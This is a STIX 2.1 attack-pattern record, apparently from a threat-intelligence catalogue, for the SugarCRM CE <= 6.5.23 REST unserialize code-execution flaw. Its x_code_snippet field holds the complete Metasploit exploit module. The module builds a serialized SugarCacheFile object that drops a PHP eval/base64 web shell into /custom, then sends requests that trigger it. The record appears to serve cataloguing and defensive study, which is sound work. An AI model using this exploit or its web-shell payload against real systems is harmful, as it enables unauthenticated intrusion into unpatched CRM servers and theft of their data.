{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e17b581f-8759-4b26-9157-a8802c14467d",
    "created": "2024-08-14T17:12:47.778322Z",
    "modified": "2024-08-14T17:12:47.778326Z",
    "name": "SugarCRM REST Unserialize PHP Code Execution",
    "description": " This module exploits a PHP Object Injection vulnerability in SugarCRM CE <= 6.5.23 which could be abused to allow unauthenticated users to execute arbitrary PHP code with the permissions of the webserver. The dangerous unserialize() call exists in the '/service/core/REST/SugarRestSerialize.php' script. The exploit abuses the __destruct() method from the SugarCacheFile class to write arbitrary PHP code into the /custom directory. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/sugarcrm_rest_unserialize_exec.rb",
            "external_id": "sugarcrm_rest_unserialize_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://karmainsecurity.com/KIS-2016-07"
        },
        {
            "source_name": "reference",
            "url": "http://www.sugarcrm.com/security/sugarcrm-sa-2016-001"
        },
        {
            "source_name": "reference",
            "url": "http://www.sugarcrm.com/security/sugarcrm-sa-2016-008"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.php.net/bug.php?id=72663"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SugarCRM REST Unserialize PHP Code Execution',\n      'Description'    => %q{\n        This module exploits a PHP Object Injection vulnerability in SugarCRM CE <= 6.5.23\n        which could be abused to allow unauthenticated users to execute arbitrary PHP code with\n        the permissions of the webserver. The dangerous unserialize() call exists in the\n        '/service/core/REST/SugarRestSerialize.php' script. The exploit abuses the __destruct()\n        method from the SugarCacheFile class to write arbitrary PHP code into the /custom directory.\n      },\n      'Author'         => 'EgiX',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['URL', 'http://karmainsecurity.com/KIS-2016-07'],\n          ['URL', 'http://www.sugarcrm.com/security/sugarcrm-sa-2016-001'],\n          ['URL', 'http://www.sugarcrm.com/security/sugarcrm-sa-2016-008'],\n          ['URL', 'https://bugs.php.net/bug.php?id=72663']\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [ ['SugarCRM CE <= 6.5.23', {}] ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2016-06-23'\n      ))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [ true, \"The base path to the web application\", \"/sugarcrm/\"])\n        ])\n  end\n\n  def exploit\n    upload_php = '/custom/' + rand_text_alpha(rand(4)+8) + '.php'\n\n    payload_serialized =  \"O:+14:\\\"SugarCacheFile\\\":23:{S:17:\\\"\\\\00*\\\\00_cacheFileName\\\";\"\n    payload_serialized << \"s:#{upload_php.length+2}:\\\"..#{upload_php}\\\";S:16:\\\"\\\\00*\\\\00\"\n    payload_serialized << \"_cacheChanged\\\";b:1;S:14:\\\"\\\\00*\\\\00_localStore\\\";a:1:{i:0;s:55\"\n    payload_serialized << \":\\\"<?php eval(base64_decode($_SERVER['HTTP_PAYLOAD'])); ?>\\\";}}\"\n\n    print_status(\"#{peer} - Exploiting the unserialize() to upload PHP code\")\n\n    res = send_request_cgi(\n    {\n      'uri'    => normalize_uri(target_uri.path, 'service/v4/rest.php'),\n      'method' => 'POST',\n        'vars_post' => {\n          'method'     => 'login',\n          'input_type' => 'Serialize',\n          'rest_data'  => payload_serialized\n        }\n    })\n\n    unless res\n      print_error('Connection timed out while sending a request to rest.php')\n      return\n    end\n\n    if res && res.code != 200\n      print_error(\"#{peer} - Exploit failed: #{res.code}\")\n      return\n    end\n\n    register_files_for_cleanup(File.basename(upload_php))\n\n    print_status(\"#{peer} - Executing the payload #{upload_php}\")\n\n    res = send_request_cgi(\n    {\n      'method'  => 'GET',\n      'uri'     => normalize_uri(target_uri.path, upload_php),\n      'headers' => { 'payload' => Rex::Text.encode_base64(payload.encoded) }\n    })\n\n    if res && res.code != 200\n      print_error(\"#{peer} - Payload execution failed: #{res.code}\")\n      return\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-06-23",
    "x_mitre_platforms": [
        "['php']"
    ]
}